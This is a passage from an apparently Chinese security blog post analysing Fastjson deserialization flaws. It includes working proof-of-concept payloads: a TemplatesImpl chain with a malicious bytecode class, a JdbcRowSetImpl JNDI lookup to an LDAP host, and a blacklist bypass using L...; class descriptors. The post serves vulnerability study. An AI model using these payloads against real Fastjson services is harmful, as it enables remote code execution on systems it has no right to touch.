style="color:#000000;">在com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask方法中，对JSON路径表达式进行处理，先尝试通过getObject方法获取refValue，获取不到的则会调用JSONPath解析函数，根据ref从value种获取对应的值。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735011746312-b1ddc479-79f9-4c05-8fd6-7522ab17ac54.png"></p><p><font style="color:#000000;">JSONPath#eval方法最终会调用到JSONPath#getPropertyValue方法，会尝试调用fieldInfo的get函数或者用利用反射的方式调用getter。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012086010-ad7ad6e6-229b-418b-b0bd-f15c056cd9c1.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012176374-9977adbf-c0dc-4e05-97da-2c711e5b4ad0.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012268675-6fe08c05-3986-43d3-92c0-d877a484e498.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012302569-8f5aa7e4-4058-4060-a2a9-706d5af21abe.png"></p><p><font style="color:#000000;">至于为什么小于fastjson 1.2.36版本无法使用该Trick，差异主要在com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask方法。在1.2.36版本以下，要求refValue不为null，且必须为JSONObject类，而获取到的refValue为null，因此无法利用。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fastjson 1.2.42</span></span><br><span class="line"><span class="keyword">if</span> (ref.startsWith(<span class="string">&quot;$&quot;</span>)) &#123;</span><br><span class="line">    refValue = getObject(ref);</span><br><span class="line">    <span class="keyword">if</span> (refValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            refValue = JSONPath.eval(value, ref);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONPathException ex) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.31</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">refValue</span> <span class="operator">=</span> ref.startsWith(<span class="string">&quot;$&quot;</span>) ? getObject(ref) : task.context.object;</span><br><span class="line"><span class="type">FieldDeserializer</span> <span class="variable">fieldDeser</span> <span class="operator">=</span> task.fieldDeserializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fieldDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (refValue != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; refValue.getClass() == JSONObject.class</span><br><span class="line">            &amp;&amp; fieldDeser.fieldInfo != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; !Map.class.isAssignableFrom(fieldDeser.fieldInfo.fieldClass)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">root</span> <span class="operator">=</span> <span class="built_in">this</span>.contextArray[<span class="number">0</span>].object;</span><br><span class="line">        refValue = JSONPath.eval(root, ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fieldDeser.setValue(object, refValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="JSONObject"><a href="#JSONObject" class="headerlink" title="JSONObject"></a>JSONObject</h4><p><font style="color:#000000;">那当fastjson &lt;&#x3D; 1.2.36时，有没有什么方法可以调用任意getter方法呢？答案是肯定，可以利用JSONObject#toString来实现这个目的。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONObjectDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Ref</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ref</span>();</span><br><span class="line">        ref.setId(<span class="string">&quot;H3rmesk1t&quot;</span>);</span><br><span class="line">        ref.setName(<span class="string">&quot;AlphaG0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Object to JSON...&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSONString(ref, SerializerFeature.WriteClassName));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\&quot;name\&quot;:\&quot;AlphaG0\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse...&quot;</span>);</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parseObject...&quot;</span>);</span><br><span class="line">        JSON.parseObject(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonRef</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;x\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;name\&quot;:\&quot;AlphaG0\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse and ref...&quot;</span>);</span><br><span class="line">        JSON.parse(jsonRef);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSONObject</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013192265-11077587-a39e-4adf-b746-5f02d83d3670.png"></p><p><font style="color:#000000;">在com.alibaba.fastjson.JSON#toString方法中，会进行序列化操作，将Object转为String。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013350422-abacfe4f-5f00-4a6a-8c3a-f6607d1347cc.png"></p><p><font style="color:#000000;">最终会调用到JavaBeanSerializer#write方法，会尝试调用fieldInfo的get函数或者用利用反射的方式调用getter。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013745008-305c043e-bea0-4f35-adc4-b7429a41e3ec.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013760964-aba7ffbd-70e4-4b69-a538-97e4662dfd3a.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013791563-06ede5e6-36d4-4d19-90b7-243889158efa.png"></p><p><font style="color:#000000;">那么如何触发com.alibaba.fastjson.JSON#toString方法呢，在反序列化过程中，需要找到一处可以使用JSONObject调用toString的地方。</font></p><p><font style="color:#000000;">DefaultJSONParser#parse方法在解析的过程中，如果遇到{会套一层JSONObject，因此需要将key构造成JSONObject，类似<code>&#123;&#123;some&#125;:x&#125;</code>。接着调用DefaultJSONParser#parseObject方法，此时key为JSONObject，调用toString方法时会触发com.alibaba.fastjson.JSON#toString方法。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014092313-29bcc42d-6f9b-4772-9a7a-4f15f31a93b9.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014669978-70ef0731-d5cc-4e8e-90ab-e9f794eba4b3.png"></p><p><font style="color:#000000;">大于fastjson 1.2.36版本中，com.alibaba.fastjson.parser.DefaultJSONParser#parseObject方法不会再调用toString函数，导致无法使用。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014875681-886c6c57-e798-4d44-b470-7489ae8a39f9.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><font style="color:#000000;">JSON要转为JavaBean</font><strong><font style="color:#000000;">通常必须开启autoType</font></strong><font style="color:#000000;">，而autoType默认情况下是关闭状态，所以不能够在未开启的情况下去反序列化指定的类，JSON解析流程大致如下。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734790104587-c761e5cc-7cd5-41ac-af4a-1eda1196eab0.png"></p><h3 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson-1.2.24"></a>fastjson-1.2.24</h3><blockquote><p><font style="color:#000000;">fastjson &lt;&#x3D; 1.2.24，fastjson默认使用@type指定反序列化任意类，攻击者可以通过在Java常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的getter&#x2F;setter方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。</font></p></blockquote><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a><font style="color:#000000;">TemplatesImpl</font></h4><p><font style="color:#000000;">在之前的文章中，无论是JNDI注入，还是反序列化，只要涉及到不出网的场景，就常常会利用到TemplatesImpl来动态加载字节码。com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类实现了Serializable接口，因此它可以被序列化。</font></p><p><font style="color:#000000;">该类中存在一个成员属性_class，是一个Class类型的数组，数组里下标为_transletIndex的类会在getTransletInstance方法中使用newInstance方法进行实例化。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936323630-c91bf7ea-f24a-4cc6-ae2d-359d1b85e371.png"></p><p><font style="color:#000000;">该类中的newTransformer方法会调用getTransletInstance方法，而该类中的getOutputProperties方法又会调用newTransformer方法。同时，getTransletInstance方法又是类成员变量_outputProperties的getter方法。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936675630-e53eff98-9dd3-4207-86bc-bfe87b0c03d9.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936712641-44c1bb74-d7e1-4550-a8a3-624d1520c912.png"></p><p><font style="color:#000000;">接着看看_class中的类是否可控，在defineTransletClasses方法中，当_bytecodes不为空时，会调用自定义的ClassLoader去加载_bytecodes，因此可以构造一个TemplatesImpl类的反序列化字符串，其中_bytecodes是构造的恶意类的类字节码，</font><strong><font style="color:#000000;">这个类的父类是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</font></strong><font style="color:#000000;">，最终这个类会被加载并使用newInstance方法进行实例化。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936926835-1b9244df-58a8-47e4-a2f2-83ebd2bd263a.png"></p><p><font style="color:#000000;">为了满足漏洞点触发之前不报异常及退出，还需要</font><strong><font style="color:#000000;">满足_name不为null，_tfactory不为null</font></strong><font style="color:#000000;">。同时，由于Payload需要赋值的一些属性为private类型，</font><strong><font style="color:#000000;">需要在parse反序列化时设置第二个参数Feature.SupportNonPublicField</font></strong><font style="color:#000000;">来让服务端从JSON中恢复private类型的属性。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734937642256-3510586a-de4a-47f7-bd74-e55428e0c715.png"></p><p><font style="color:#000000;">除此之外，由于传入的_bytecodes为bytes类型，而Fastjson在解析的时候会对bytes类型进行Base64解码，因此</font><strong><font style="color:#000000;">需要将恶意类的字节码Base64编码</font></strong><font style="color:#000000;">。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734937558578-1fe215e0-4227-4745-b9d3-4bca0c62f7fc.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p><font style="color:#000000;">在com.sun.rowset.JdbcRowSetImpl#connect方法中，当this.conn为null且dataSource不为null时，会调用javax.naming.InitialContext#lookup方法来触发JNDI注入，且参数为dataSource。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734938610334-d429eb5e-8f43-43e1-9545-7f9e12d09d5c.png"></p><p><font style="color:#000000;">而com.sun.rowset.JdbcRowSetImpl#setAutoCommit方法会调用connect方法，且满足上文提到的setter方法的要求。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:1037/Evil\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h3><blockquote><p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41，官方对之前的反序列化漏洞进行了修复，引入了checkAutoType安全机制，默认情况下autoTypeSupport关闭，不能直接反序列化任意类，而打开AutoType之后，是基于内置黑名单来实现安全的，fastjson也提供了添加黑名单的接口。</font></p></blockquote><p><font style="color:#000000;">在1.2.24版本会直接加载@type指向的类，而1.2.25版本增加了对类的检查，在com.alibaba.fastjson.parser.ParserConfig类中，对要加载的类进行白名单和黑名单限制，并且引入了一个配置参数AutoTypeSupport。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="built_in">this</span>.config.checkAutoType(ref, (Class)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">黑名单denyList包括：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.denyList = <span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="string">&quot;,&quot;</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">添加反序列化白名单有3种方法：</font></p><ol><li><font style="color:#000000;">使用代码进行添加，ParserConfig.getGlobalInstance().addAccept(“org.example.fastjson.poc”)</font></li><li><font style="color:#000000;">加上JVM启动参数，-Dfastjson.parser.autoTypeAccept&#x3D;org.example.fastjson</font></li><li><font style="color:#000000;">在fastjson.properties中添加，fastjson.parser.autoTypeAccept&#x3D;org.example.fastjson</font></li></ol><p><font style="color:#000000;">跟进一下checkAutoType方法，如果开启了autoType，先判断类名是否在白名单中，如果在，使用TypeUtils#loadClass方法加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    String deny;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="built_in">this</span>.acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="built_in">this</span>.denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进一下com.alibaba.fastjson.util.TypeUtils#loadClass方法，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的[、L、;字符，这也同时导致了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符会被处理掉。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种潜在的绕过方式如下：</p><ul><li>如果以[开头则去掉[后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）</li><li>如果以L开头，以;结尾，则去掉开头和结尾进行类加载</li></ul><p><font style="color:#000000;">因此，漏洞利用思路为，</font><strong><font style="color:#000000;">开启autoType，在类名中以L开头和;结尾绕过黑名单</font></strong><font 